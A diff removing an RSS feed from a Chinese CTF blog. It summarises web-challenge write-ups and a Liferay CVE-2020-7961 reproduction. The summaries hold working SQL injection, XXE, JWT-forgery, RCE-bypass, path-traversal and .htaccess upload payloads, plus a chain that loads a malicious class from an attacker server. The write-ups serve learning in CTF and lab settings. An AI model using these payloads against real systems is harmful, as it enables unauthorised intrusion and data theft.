@@ -1,788 +1,0 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?>
-<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
-  <channel>
-    <title>Tmps on wh1sper</title>
-    <link>https://anthem-whisper.github.io/tmp/</link>
-    <description>Recent content in Tmps on wh1sper</description>
-    <generator>Hugo -- gohugo.io</generator>
-    <language>en-us</language><atom:link href="https://anthem-whisper.github.io/tmp/index.xml" rel="self" type="application/rss+xml" />
-    <item>
-      <title>0xGame2020出题笔记</title>
-      <link>https://anthem-whisper.github.io/tmp/0xgame2020%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://anthem-whisper.github.io/tmp/0xgame2020%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/</guid>
-      <description>学校有史以来第一次这么简单的新生赛，我承担平台的运维和web出题。
-第一次出这么多题，虽然题目难度都不大，不过折腾和搞平台环境还是花了不少精力，目的在于三点：
- 希望CTF能在学校更普及 希望能找到有兴趣和有毅力的学弟学妹 题目很多都是来自入门文档的知识点，看过的一定很容易做出来，希望新同学能认真看资料   题目开源地址：https://github.com/Anthem-whisper/0xGame2020
-所有题目环境：https://shimo.im/docs/8hkRHdRDdWyKycyK
-因为是自费运营，还请师傅们不要恶意破坏环境
-第一周 题目都是最简单的入门题目，也不涉及web漏洞，没什么好说的。主要考察同学们配置环境的动手能力。
-第二周 出了一道很简单的SQL注入，
-核心是要猜测登录时所拼接的sql语句：
-$sql = &amp;quot;select username from user where username=&#39;&amp;quot;. $username .&amp;quot;&#39; and password=&#39;&amp;quot;. $password .&amp;quot;&#39;;&amp;quot;;没有任何waf，在用户名处输入admin&#39; or 1=1#搞定，由于#符号把后面的语句注视掉了，实际上sql语句实际上变成了：
-select username from user where username=&#39;admin&#39; or 1=11=1是永远成立的，所以必然能返回大于一行的数据，也就是 mysql_num_rows($res)&amp;gt;0，就可以获得flag
-第三周 一道XXE，一道SQL布尔盲注
-inject_me XXE是去年NCTF2019的原题，我在web入门doc里面写过，并且题目地址和源码我都给了。
-在给了hint的情况下这么少的解还是出乎我的意料
-由HTTP响应里面返回的标签以及Content-Type是xml格式可以很轻易的百度到XXE这种攻击手段
-XXE学习：https://xz.aliyun.com/t/3357
-告诉了/flag，那么随手一个payload就出来了：
-&amp;lt;?xml version=&amp;quot;1.0&amp;quot;?&amp;gt;&amp;lt;!DOCTYPE dy [&amp;lt;!ENTITY dy SYSTEM &amp;quot;file:///flag&amp;quot;&amp;gt;]&amp;gt;&amp;lt;user&amp;gt;&amp;lt;username&amp;gt;&amp;amp;dy;&amp;lt;/username&amp;gt;&amp;lt;password&amp;gt;123&amp;lt;/password&amp;gt;&amp;lt;/user&amp;gt;close_eyes 布尔盲注很多同学用手打，本来目的是想叫你们去学python的，结果硬是手打出来了，下次出个128位的flag（bushi
-本来想稍微加点waf的，后来不想出难了就没加，开SQLmap的莫得灵魂。
-布尔盲注学习：https://xz.aliyun.com/t/7169#toc-2
-这篇文章不仅仅讲了盲注也讲了其他的一些手法，值得钻研一番
-思路就是语句为假的时候（比如我用户名输入1&#39;||1=0#或者乱输一个用户名密码），页面回显“数据库里没你这号人,别想骗劳资.jpg”
-为真的时候（比如我输入1&#39;||1=1#）页面回显“数据库有你这号人，那又怎么着？”，根据回显情况的不同，我们就可以判断我们的condition究竟是真还是假。
-1&#39;||(condition)#不断地改变condition就可以查到我们想要的数据；</description>
-    </item>
-    
-    <item>
-      <title>2020 X1cT34m WEB方向最终考核</title>
-      <link>https://anthem-whisper.github.io/tmp/2020-x1ct34m-web%E6%96%B9%E5%90%91%E6%9C%80%E7%BB%88%E8%80%83%E6%A0%B8/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://anthem-whisper.github.io/tmp/2020-x1ct34m-web%E6%96%B9%E5%90%91%E6%9C%80%E7%BB%88%E8%80%83%E6%A0%B8/</guid>
-      <description>前言 从第一次考核到第二次考核，明显感觉自己实力提升了一个层次，不过以后要走的路要踩的坑还很多。
-这次题目很给力，一共九道，难的简单的都有，幸苦@jylsec和@byc_404学长给我们搭建平台和出题目
-对CTF的套路还是不过熟悉，或者说思路还是不够灵敏，导致有些题目卡了很久没拿到一血，这里也膜一下Leon师傅（真的打不过）
-纪念 想看wp？怎么可能有wp，这辈子都不可能有wp。上一张纪念图，纪念我和leon师傅纠缠不清的爱情。
-其他的师傅也要多多加油嗷~~</description>
-    </item>
-    
-    <item>
-      <title>2020 X1cT34m Web第一次考核</title>
-      <link>https://anthem-whisper.github.io/tmp/2020-x1ct34m-web%E7%AC%AC%E4%B8%80%E6%AC%A1%E8%80%83%E6%A0%B8/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://anthem-whisper.github.io/tmp/2020-x1ct34m-web%E7%AC%AC%E4%B8%80%E6%AC%A1%E8%80%83%E6%A0%B8/</guid>
-      <description>0x00前言 终于等到来的太突然的考核，感觉自己表现不是太好，本来入门时间也不短了，是因为不够努力才这么菜
-玩了一把内网渗透（不是），感觉有点意思。
-0x01第一题 考点：sqli
- username中\转义&amp;rsquo;导致password语句逃逸单引号 union注入 绕过逗号过滤继续注入 无列名注入  打开题目，抓包，发现POST过去的数据是json形式，没想到其他，只想到了sqli，于是我用bp的intruder模块fuzz了一下：
-(这里本来有一个表，莫名其妙消失了)
-被过滤：单引号、|、，、or、空格
-没被过滤：select、union
-空格被过滤，用//代替，（可以使用word的替换功能）本文的空格都是//
-既然单引号被过滤了，那么就想到了CGCTF和之前的BJDCTF的注入，利用username输入反斜杠来转义单引号，直接看例子：
-原本语句：SELECT * from user WHERE username = &#39;admin&#39; and password = &#39;123&#39;转义语句：SELECT * from user WHERE username = &#39;admin\&#39; and password =&#39; or 1=1#&#39;我们可以看到，实际上第二句的username是&#39;admin\&#39; and password =&#39;后门接的or 1=1自然也就造成了注入。
-这道题正常输入的时候回显是username or password error如果使用这个playload的话回显是true
-union没有被过滤的话，那么就尝试union注入吧：
-查询列数：{&amp;quot;username&amp;quot;:&amp;quot;1\\&amp;quot;,&amp;quot;password&amp;quot;:&amp;quot;group/**/by/**/1#&amp;quot;}这里有点玄学的是，明明查的是三列，但是只能group by 1有回显，就很神奇。
-查询列数： {&amp;quot;username&amp;quot;:&amp;quot;1\\&amp;quot;,&amp;quot;password&amp;quot;:&amp;quot;union/**/select/**/1,2,3#&amp;quot;}回显是“WAF！！！”因为逗号被过滤了
-利用join绕过逗号过滤：
-union select * from ((select 1)A join (select 2)B join (select 3)C)#//union select * from ((select 1)A join (select 2)B join (select 3)C)#查询成功，列数为3，2和3分别为username和password的回显位置，就可以替换为子查询，但是最致命的是or被过滤了，造成了information_schema背锅，所以我们需要bypass information_schema</description>
-    </item>
-    
-    <item>
-      <title>2020“巅峰极客”</title>
-      <link>https://anthem-whisper.github.io/tmp/2020%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://anthem-whisper.github.io/tmp/2020%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/</guid>
-      <description>babyphp2 考点：phar反序列化、pop链、compress.zlib://phar://绕过^phar
-Paper：https://paper.seebug.org/680/
-题目一开始有www.zip给了源代码，下载过来审计;
-大概是有三个功能：文件上传、文件读取、SQL查询（登录框）
-phar反序列化 我们可以看到class.php里面有很多的类，可以想到可能存在反序列化，但是在源码里面没有unserialize的操作。不过，他有一个功能是文件上传，那么我们自然而然的想到了phar反序列化。
-class.php
-&amp;lt;?phperror_reporting(0);session_start();class User{public $id;public $age=null;public $nickname=null;public $backup;public function login() {if(isset($_POST[&#39;username&#39;])&amp;amp;&amp;amp;isset($_POST[&#39;password&#39;])){$mysqli=new dbCtrl();$this-&amp;gt;id=$mysqli-&amp;gt;login();if($this-&amp;gt;id){$_SESSION[&#39;id&#39;]=$this-&amp;gt;id;$_SESSION[&#39;login&#39;]=1;echo &amp;quot;你的ID是&amp;quot;.$_SESSION[&#39;id&#39;];echo &amp;quot;你好！&amp;quot;.$_SESSION[&#39;token&#39;];echo &amp;quot;&amp;lt;script&amp;gt;window.location.href=&#39;upload.php&#39;&amp;lt;/script&amp;gt;&amp;quot;;}}}public function upload(){$uploader=new Upload();$uploader-&amp;gt;upload();}public function read(){$reader=new reader();$reader-&amp;gt;read($_POST[&#39;filename&#39;]);}public function __toString(){$this-&amp;gt;nickname-&amp;gt;backup=$this-&amp;gt;backup;$user = new User();$user-&amp;gt;id = $_SESSION[&#39;id&#39;];$user-&amp;gt;nickname = $_SESSION[&#39;token&#39;];return serialize($user);}}class dbCtrl{public $hostname=&amp;quot;127.</description>
-    </item>
-    
-    <item>
-      <title>BUUOJ刷题记录</title>
-      <link>https://anthem-whisper.github.io/tmp/buuoj%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://anthem-whisper.github.io/tmp/buuoj%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</guid>
-      <description>[SUCTF 2019]EasySQL 考点：堆叠注入、MySQL中sql_mode参数
-题目存在过滤，尝试之后发现可以通过0 || 1这样的语句进行bool盲注，但是此题似乎限制了输入信息的长度，所以这个盲注只能注出来库名CTF后面的东西就没办法搞，后来看了wp之后才知道存在堆叠注入，尝试之：
-1;并没有报错，而且返回了查询成功额页面，所以存在堆叠注入
-1;show databases;返回
-Array ( [0] =&amp;gt; 1 ) Array ( [0] =&amp;gt; ctf ) Array ( [0] =&amp;gt; ctftraining ) Array ( [0] =&amp;gt; information_schema ) Array ( [0] =&amp;gt; mysql ) Array ( [0] =&amp;gt; performance_schema ) Array ( [0] =&amp;gt; test )表名：
-1;show tables;返回：
-Array ( [0] =&amp;gt; 1 ) Array ( [0] =&amp;gt; Flag )但是flag关键字被过滤了，</description>
-    </item>
-    
-    <item>
-      <title>BUUOJ刷题记录(2)</title>
-      <link>https://anthem-whisper.github.io/tmp/buuoj%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://anthem-whisper.github.io/tmp/buuoj%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/</guid>
-      <description>[CISCN2019 华北赛区 Day1 Web2]ikun 考点：简单python脚本、逻辑漏洞、JWT破解与伪造、python反序列化
-页面源码里面提示脑洞比较大，给了提示，如上图
-目的是要买到LV6的东西，下面则是500页的商品，需要我们自行寻找。
-在源码里面看到，每个商品的图片就是lv?.png那么我们推测lv6.png一定存在于某一页。
-写一个脚本找找：
-#by wh1sperimport requestshost = &#39;http://7d1e7948-30d9-42b8-b6e6-f74e7fc4a5eb.node3.buuoj.cn/shop?page=&#39;for i in range(1,500):r = requests.get(url=host+str(i))if &#39;lv6.png&#39; in r.text:print(&#39;page = &#39;, i)break得到181，访问之：
-http://7d1e7948-30d9-42b8-b6e6-f74e7fc4a5eb.node3.buuoj.cn/shop?page=181不出预料的买不起。。。
-但是我们回头去看burp里面的数据包，发现请求体里面有一个键名为discount=0.8，改成discount=0.00000000001试试，果然可以，成功购买了lv6，页面重定向到 /b1g_m4mber 不过提示这个页面只能admin才能访问。于是我们又回过头去看请求头，发现cookie里面有一个东西叫做JWT（Json Web Token）
-JWT=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IndoMXNwZXIifQ.Z3wlMUbdDHNs4x4PiVx43YD-CGibsHUC5f3ApnYId58附上爆破工具GitHub地址：https://github.com/brendan-rius/c-jwt-cracker
-root@kali:~/tools/JWTcrake/c-jwt-cracker-master# ./jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IndoMXNwZXIifQ.Z3wlMUbdDHNs4x4PiVx43YD-CGibsHUC5f3ApnYId58Secret is &amp;quot;1Kun&amp;quot;root@kali:~/tools/JWTcrake/c-jwt-cracker-master#在https://jwt.io/这个网站可以进行伪造，把身份改成admin。
-我们就可以愉快的进行伪造了，打开F12-&amp;gt;application-&amp;gt;cookie,将JWT值改成：
-eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.40on__HQ8B2-wM1ZSwax3ivRK4j54jlaXv-1JjQynjo刷新之后我们就是admin啦~
-ctrl+U查看源码，提示了/static/asd1f654e683wq/www.zip网站源码，
-下载下来，发现是python的tornado框架编写的后端
-在/sshop/views/Admin.py里面发现了python反序列化漏洞：
-#by wh1sper#Admin.pyimport tornado.webfrom sshop.base import BaseHandlerimport pickleimport urllibclass AdminHandler(BaseHandler):@tornado.</description>
-    </item>
-    
-    <item>
-      <title>BUUOJ刷题记录(3)</title>
-      <link>https://anthem-whisper.github.io/tmp/buuoj%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%953/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://anthem-whisper.github.io/tmp/buuoj%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%953/</guid>
-      <description>[FBCTF2019]RCEService 考点：%0a绕过正则匹配，绝对路径调用系统命令
-要求用json传入cmd参数RCE，但是只给了ls命令其他的都不给
-比赛的时候应该是给了源码：
-&amp;lt;?phpputenv(&#39;PATH=/home/rceservice/jail&#39;);if (isset($_REQUEST[&#39;cmd&#39;])) {$json = $_REQUEST[&#39;cmd&#39;];if (!is_string($json)) {echo &#39;Hacking attempt detected&amp;amp;lt;br/&amp;amp;gt;&amp;amp;lt;br/&amp;amp;gt;&#39;;} elseif (preg_match(&#39;/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/&#39;, $json)) {echo &#39;Hacking attempt detected&amp;amp;lt;br/&amp;amp;gt;&amp;amp;lt;br/&amp;amp;gt;&#39;;} else {echo &#39;Attempting to run command:&amp;amp;lt;br/&amp;amp;gt;&#39;;$cmd = json_decode($json, true)[&#39;cmd&#39;];if ($cmd !== NULL) {system($cmd);} else {echo &#39;Invalid input&#39;;}echo &#39;&amp;amp;lt;br/&amp;amp;gt;&amp;amp;lt;br/&amp;amp;gt;&#39;;}}?&amp;gt;正则匹配的时候没有用m修饰符(换行匹配)，所以我们可以用%0a来绕过
-然后他设置了PATH=/home/rceservice/jail，这个目录下只有ls一个命令，想要调用其他系统命令我们还要传入绝对路径，比如/bin/cat。
-flag在PATH的上级目录。
-?cmd={%0A&amp;quot;cmd&amp;quot;:&amp;quot;/bin/cat /home/rceservice/flag&amp;quot;%0A}[GYCTF2020]FlaskApp 考点：flaskSSTI、pin码
-referer：https://blog.csdn.net/Alexhcf/article/details/108400293
-从base64解码发现SSTI 题目最开始给了两个页面，一个是base64加密、一个是base64解密
-在base64解密的页面如果解密出现错误的话，会开启debug
-而且在base64解密的页面发现了模板注入，传入{{config}}的base64编码会看到以下界面：</description>
-    </item>
-    
-    <item>
-      <title>ByteCTF2020复现</title>
-      <link>https://anthem-whisper.github.io/tmp/bytectf2020%E5%A4%8D%E7%8E%B0/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://anthem-whisper.github.io/tmp/bytectf2020%E5%A4%8D%E7%8E%B0/</guid>
-      <description>这次ByteCTF2020的web题目非常顶，第一天比赛快结束的时候全场web才有了第一个解，后来解人数最多的XSS也就不过十个解，可惜一直在看爬虫的题，最后还是没做出。
- easy_scrapy 考点：MD5爆破、SSRF
-功能是添加一个http://或者https://开头的URL，并且要求输入验证码，可以利用以下脚本来爆破：
-import hashlibfor i in range(99999999):if hashlib.md5(str(i).encode(&#39;UTF-8&#39;)).hexdigest()[:6] == &#39;2c97b3&#39;:print(i)break十几秒能出结果，之后可以BP重放数据包来快速的添加。
-添加成功之后可以在MyUrlList里面看到添加记录，点进去可以看到爬取到的东西。
-监听端口接收到请求：
-GET / HTTP/1.1Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: enUser-Agent: scrapy_redisAccept-Encoding: gzip, deflate发现是scrapy_redis，初步猜测是SSRF打redis。
-既然他是爬虫，那么遇到类似于这种标签的话，他很有可能就会去请求，（后来放了HINT，叫去读这个页面的源码）尝试爬以下这道题的公网IP，发现他会把/list的源码一并爬下来，那么我们可以起一个页面来指向file:///etc/passwd
-比赛的时候我用的是302重定向好像不行（哭了），其实这里他遇到一个标签就会去请求：
-我们可以发现他请求到了我们想要的URL：
-把标签的href改成file协议果然可以造成任意文件读：
-这样的话我们可以逐一的读取他爬虫的源码，但是在这之前我们要先知道爬虫工作的绝对路径，可以通过读/proc/self/environ，得到绝对路径PWD=/code，这个知识点在本站[SWPU2019]Web3也提到过。
-在官方文档中找到了这个爬虫框架的结构：
-tutorial/scrapy.cfgtutorial/__init__.pyitems.pypipelines.pysettings.pyspiders/__init__.py...我们尝试去读取这些文件；
-scrapy.cfg:
-# Automatically created by: scrapy startproject## For more information about the [deploy] section see:# https://scrapyd.readthedocs.io/en/latest/deploy.html[settings]default = bytectf.</description>
-    </item>
-    
-    <item>
-      <title>CG-CTF_wp</title>
-      <link>https://anthem-whisper.github.io/tmp/cg-ctf_wp/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://anthem-whisper.github.io/tmp/cg-ctf_wp/</guid>
-      <description>cgctf不得不说是一个很棒的学习平台，这里有我写的部分wp：
-\0x00 考点：%00截断（ereg函数的截断漏洞）、数组绕过（ereg函数的另一个漏洞）
-题目直接给源码：
-view-source:if (isset ($_GET[&#39;nctf&#39;])) {if (@ereg (&amp;quot;^[1-9]+$&amp;quot;, $_GET[&#39;nctf&#39;]) === FALSE)echo &#39;必须输入数字才行&#39;;else if (strpos ($_GET[&#39;nctf&#39;], &#39;#biubiubiu&#39;) !== FALSE) die(&#39;Flag: &#39;.$flag);elseecho &#39;骚年，继续努力吧啊~&#39;;} 这里ereg有两个漏洞：  ①%00截断及遇到%00则默认为字符串的结束
-②当ntf为数组时它的返回值不是FALSE
-法一：数组绕过index.php?nctf[]=#biubiubiu法二：\x00截断index.php?nctf=1%00%23biubiubiunctf{use_00_to_jieduan}
-php 反序列化(暂时无法做) 考点：对象包含的引用在序列化时也会被存储
-题目源码：
-&amp;lt;?phpclass just4fun {var $enter;var $secret;}if (isset($_GET[&#39;pass&#39;])) {$pass = $_GET[&#39;pass&#39;];if(get_magic_quotes_gpc()){$pass=stripslashes($pass);}$o = unserialize($pass);if ($o) {$o-&amp;gt;secret = &amp;quot;*&amp;quot;;if ($o-&amp;gt;secret === $o-&amp;gt;enter)echo &amp;quot;Congratulation!</description>
-    </item>
-    
-    <item>
-      <title>CVE-2020-7961 Liferay Portal 反序列化-复现</title>
-      <link>https://anthem-whisper.github.io/tmp/cve-2020-7961-liferay-portal-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E5%A4%8D%E7%8E%B0/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://anthem-whisper.github.io/tmp/cve-2020-7961-liferay-portal-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E5%A4%8D%E7%8E%B0/</guid>
-      <description>漏洞说明 Liferay是一个开源的Portal产品,提供对多个独立系统的内容集成,为企业信息、流程等的整合提供了一套完整的解决方案,和其他商业产品相比,Liferay有着很多优良的特性,而且免费,在全球都有较多用户。该漏洞是个反序列化导致的RCE，通过未授权访问其api传递json数据进行反序列化，危害较高
-影响范围 Liferay Portal 6.1、6.2、7.0、7.1、7.2
-环境搭建 漏洞环境：
-windows 10
-jre1.8.0_221
-jdk1.8.0_221
-tomcat集成包：https://github.com/liferay/liferay-portal/releases/tag/7.2.0-ga1 （我用的liferay-ce-portal-tomcat-7.2.0-ga1-20190531153709761.tar.gz）
-启动环境 E:\tmp\liferay-ce-portal-tomcat-7.2.0-ga1-20190531153709761\liferay-portal-7.2.0-ga1\tomcat-9.0.17\bin&amp;gt; .\catalina.bat run访问 http://localhost:8080/ 全部默认配置就可以
-漏洞利用 思路：构造恶意class文件-&amp;gt;构造序列化-&amp;gt;反序列化-&amp;gt;加载VPS上面恶意evil.class文件-&amp;gt;实现下载webshell
-构造恶意class文件 在VPS上面创建 LifExp.java（该写法为目标是Windows，运行计算器）-&amp;gt;编译class文件
-public class LifExp { static { try { String[] cmd = {&amp;quot;cmd.exe&amp;quot;, &amp;quot;/c&amp;quot;, &amp;quot;calc.exe&amp;quot;};//命令执行java.lang.Runtime.getRuntime().exec(cmd).waitFor(); } catch ( Exception e ) { e.printStackTrace(); } } }使用 javac .\LifExp.java 生成class文件
-在当前目录使用 python -m SimpleHTTPServer 8000 监听8000端口启动一个wbe服务
-构造序列化 使用 marshalsec-0.0.3-SNAPSHOT-all.jar 文件进行序列化：
-java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.</description>
-    </item>
-    
-    <item>
-      <title>DASCTF2020</title>
-      <link>https://anthem-whisper.github.io/tmp/dasctf2020.6%E6%9C%88%E8%B5%9B/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://anthem-whisper.github.io/tmp/dasctf2020.6%E6%9C%88%E8%B5%9B/</guid>
-      <description>因为和第五空间连着，然后昨天下午又去打了一场AWD，感觉身体掏空，就认真打了DASCTF（咕咕咕），剩下的题目等有机会再复现
- 简单的计算器-1 考点：python eval()代码注入，命令执行结果外带
-访问Source可以看到源码：
-#!/usr/bin/env python3# -*- coding: utf-8 -*-from flask import Flask, render_template, request,sessionfrom config import black_list,createimport osapp = Flask(__name__)app.config[&#39;SECRET_KEY&#39;] = os.urandom(24)## flag is in /flag try to get it@app.route(&#39;/&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])def index():def filter(string):#这里是下午暗改过的，本来只过滤了orfor black_word in black_list:if black_word in string:return &amp;quot;hack&amp;quot;return stringif request.method == &#39;POST&#39;:input = request.form[&#39;input&#39;]create_question = create()input_question = session.</description>
-    </item>
-    
-    <item>
-      <title>DASCTF2020</title>
-      <link>https://anthem-whisper.github.io/tmp/dasctf2020.7%E6%9C%88%E8%B5%9B/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://anthem-whisper.github.io/tmp/dasctf2020.7%E6%9C%88%E8%B5%9B/</guid>
-      <description>Ezfileinclude 考点：Unix时间戳、文件包含、目录穿越
-开局一张图，发现源码 image.php?t=1595664783&amp;amp;f=Z3F5LmpwZw==
-访问之，回显：What&#39;s your time? 仔细看t参数是一个unix时间戳，然后f是base64后的文件名；
-直接写脚本，目录穿越读取/flag
-import timeimport requestsimport base64t = int(time.time())f = &#39;gqy.jpg?../../../../../../flag&#39;f = base64.b64encode(f.encode()).decode()print(t, f)host = &#39;http://183.129.189.60:10009/image.php?t={}&amp;amp;f={}&#39;.format(t, f)head = {&#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0)&#39;,&#39;Accept&#39;: &#39;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&#39;}r = requests.get(url=host, headers=head)print(r.text)SQLi 考点：无列名注入，sys.schema_tables_with_full_table_scans
-访问要求传入id参数：
-http://183.129.189.60:10004/?id=1;返回waf：
-return preg_match(&amp;quot;/;|benchmark|\^|if|[\s]|in|case|when|sleep|auto|desc|stat|\||lock|or|and|&amp;amp;|like|-|`/i&amp;quot;, $id); stat意味着过滤了sys.schema_table_statistics_with_buffer,sys.x$schema_table_statistics_with_buffer,mysql.innodb_table_stats
-or意味着过滤了information_schema
-由waf想到了union注入：
-?id=0%27union/**/select/**/1,2,3%23Array ( [0] =&amp;gt; 1 [id] =&amp;gt; 1 [1] =&amp;gt; 2 [username] =&amp;gt; 2 [2] =&amp;gt; 3 [password] =&amp;gt; 3 )可以看到库名：</description>
-    </item>
-    
-    <item>
-      <title>De1CTF2020_check in</title>
-      <link>https://anthem-whisper.github.io/tmp/de1ctf2020_check-in/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://anthem-whisper.github.io/tmp/de1ctf2020_check-in/</guid>
-      <description>本次De1CTF是XCTF的第一场分站赛，不但吸引了国内许许多多的战队，还有非常多的国外的战队，据说前26名一半都是国外的。当然比赛题目也是非常的难，感觉自己在这种大比赛上面还是不能发挥什么作用。
- check in 打开就是一个经典的文件上传页面，上传一个普通的图片马，页面回显：
-perl|pyth|ph|auto|curl|base|&amp;gt;|rm|ruby|openssl|war|lua|msf|xter|telnet in contents!文件内容被ban了这些，
-随后尝试了一些文件名称，只要文件名带ph、html、.user.ini之类的都会直接返回filename error
-不过这么多东西都被ban了，唯独 .htaccess 没有被ban。
-不过这个我开局就尝试了，但是没有发现什么姿势。
-关于 .htaccess 几种姿势：  将特定文件作为php解析，用作后门。 PHP环境下使用 auto_prepend_file 或 auto_append_file 创建后门（对于CGI/FastCGI模式 PHP 5.3.0 以上版本，还可以使用 在目录下创建.user.ini文件 。来引入该参数） CGI启动方式的RCE利用姿势 FastCGI启动方式的RCE利用姿势 重定向  这道题ban掉了ph关键字之后，（1）中的方法看似不可以用，实则另有玄机。
-在XNUCA2019中，一道web题目ezphp的非预期解中，利用到了 \ 拼接 .htaccess 文件中换行的内容，当时一种是为了利用第一行的 # 符号拼接第二行的垃圾数据来达到注释垃圾数据的目的，另一种也是 \ 拼接绕过关键字过滤。具体可以参看XNUCA2019 ez系列web题解和X-NUCA 2019 Web WP
-文件名 .htaccess，MIME改成 image/jpg ，文件内容：
-AddType application/x-httpd-p\hp .jpg那么我们通过\来拼接绕过了ph关键字之后，我们可以发现我们上传的jpg文件不再是无法查看的情况：
-第二个点，PHPecho短标签。
-过滤了 &amp;gt; 和 ph 的情况下， &amp;lt;?php ?&amp;gt; 和 &amp;lt;script&amp;gt; 这种被通杀了，参考网上的一篇文章：
-PHP 的四种标签写法 &amp;lt;?</description>
-    </item>
-    
-    <item>
-      <title>Debian下PHP Xdebug调试环境搭建</title>
-      <link>https://anthem-whisper.github.io/tmp/debian%E4%B8%8Bphp-xdebug%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://anthem-whisper.github.io/tmp/debian%E4%B8%8Bphp-xdebug%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</guid>
-      <description>Debian下PHP Xdebug调试环境搭建  本文永久链接：http://wh1sper.com/debian%e4%b8%8bphp-xdebug%e8%b0%83%e8%af%95%e7%8e%af%e5%a2%83%e6%90%ad%e5%bb%ba/
- 前言 Xdebug是PHP的扩展，用于协助调试和开发。
- 它包含一个用于IDE的调试器 它升级了PHP的var_dump()函数 它为通知，警告，错误和异常添加了堆栈跟踪 它具有记录每个函数调用和磁盘变量赋值的功能 它包含一个分析器 它提供了与PHPUnit一起使用的代码覆盖功能。  本地跟代码必备的工具。 但不推荐在生产环境中使用xdebug，因为他太重了。
-预置环境   OS: Kali GNU/Linux Rolling x86_64
-  Kernel: 5.7.0-kali1-amd64
-  PHP version: 7.4.14
-  Server API: FPM/FastCGI
-  nginx version: nginx/1.18.0
-  PhpStorm version: 2020.3
-  下载安装Xdebug 访问https://xdebug.org/wizard
-在web服务器中放入phpinfo，（注意最好是使用web服务，如果是本地php脚本的话php.ini可能会不一样）
-访问之后将整个页面源码Ctrl+A Ctrl+C复制到框里面： 分析之后会自动给你最合适的版本，并且告诉你后续安装步骤。
-下载给出的.tar.tgz文件
-1.安装PHP拓展
-apt-get install php-dev autoconf automake2.解压
-tar -xvzf xdebug-3.0.2.tgzcd xdebug-3.0.23.</description>
-    </item>
-    
-    <item>
-      <title>DozerCTF2020_web</title>
-      <link>https://anthem-whisper.github.io/tmp/dozerctf2020_web/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://anthem-whisper.github.io/tmp/dozerctf2020_web/</guid>
-      <description>又是一场把萌新骗过去杀的比赛，弹计算器好玩，域渗透不会，xxe盲打ssrf学到了
- sqli-labs 0 考点：URL二次编码，堆叠注入
-堆叠其实很简单，也发现什么过滤，主要是二次编码有点坑。。。
-查看库名：
-?id=1%2527;show%20databases;%23 查看表名：
-?id=1%2527;show%20tables;%23查看表的第一条数据：
-?id=1%2527;handler%20uziuzi%20open;handler%20uziuzi%20read%20first;%23 flag{594cb6af684ad354b4a59ac496473990}
-白给的反序列化 考点：PHP反序列化
-开题送码：
